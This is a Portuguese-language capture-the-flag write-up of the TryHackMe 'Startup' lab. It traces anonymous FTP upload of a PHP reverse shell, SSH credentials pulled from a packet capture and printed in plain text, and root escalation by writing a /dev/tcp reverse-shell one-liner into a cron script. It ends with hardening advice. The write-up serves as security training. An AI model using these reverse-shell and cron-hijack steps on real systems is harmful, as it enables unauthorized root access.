---
title: "TryHackMe Writeup: Startup"
date: 2025-11-28
description: "Avaliação multivetorial envolvendo FTP anônimo, análise de tráfego (PCAP) e exploração de Cron job inseguro."
tags: ["tryhackme", "ftp-anonymous", "pcap", "cron", "mitre-attack"]
layout: "page"
showPagination: true
showDate: true
showReadingTime: true
showWordCount: true
showAuthorBottom: true
---

### Resumo Executivo

Avaliação de segurança conduzida seguindo as metodologias PTES e NIST SP 800-115. O comprometimento iniciou via um serviço FTP anônimo com permissões de escrita. A pós-exploração envolveu análise de tráfego de rede (PCAP) para extração de credenciais, levando à elevação total de privilégios através de um script com permissão de escrita executado por um Cron job com nível root.

### Cadeia de Ataque (Mapeamento PTES)

#### 1. Reconhecimento & Acesso Inicial
Foi encontrado um serviço FTP permitindo login anônimo com acesso de escrita no diretório compartilhado.
```bash
nmap -Pn -sS -p- -T4 -sV 10.64.188.136
```
Um reverse shell foi carregado via FTP e executado através do servidor web (`/files/ftp/shell.php`).
* **Técnica MITRE:** [T1190](https://attack.mitre.org/techniques/T1190/) - Exploit Public-Facing Application.

#### 2. Movimentação Lateral
A enumeração interna revelou um arquivo de captura de pacotes (`suspecious.pcapng`). A análise do tráfego expôs credenciais SSH em texto claro para o usuário `lennie`.
```bash
# Credenciais encontradas: lennie:c4ntg3t3n0ughsp1c3
ssh lennie@10.64.188.136
```
* **Técnica MITRE:** [T1552.001](https://attack.mitre.org/techniques/T1552/001/) - Unsecured Credentials: Password in Files.

#### 3. Pós-Exploração (Elevação de Privilégio)
Foi encontrado um Cron job executando um script (`/etc/print.sh`) que possuía permissão de escrita pelo usuário `lennie`.
```bash
ls -l /etc/print.sh # -rwx------ 1 lennie lennie
```
O script foi modificado para executar um reverse shell, o qual foi acionado pelo Cron do sistema como root.
```bash
echo 'sh -i >& /dev/tcp/<IP>/4444 0>&1' > /etc/print.sh
```
* **Técnica MITRE:** [T1053.003](https://attack.mitre.org/techniques/T1053/003/) - Scheduled Task/Job: Cron.

### Recomendações (NIST SP 800-115)

* **Hardening de Serviço:** Desabilitar o login anônimo no FTP e restringir as permissões de escrita.
* **Exposição de Dados Sensíveis:** Garantir que capturas de pacotes e logs sensíveis não sejam acessíveis a usuários com baixos privilégios.
* **Automação Segura:** Auditar todos os scripts de sistema executados por Cron jobs. Assegurar que sejam de propriedade do root e que não possuam permissões de escrita global (world-writable) ou por usuários comuns.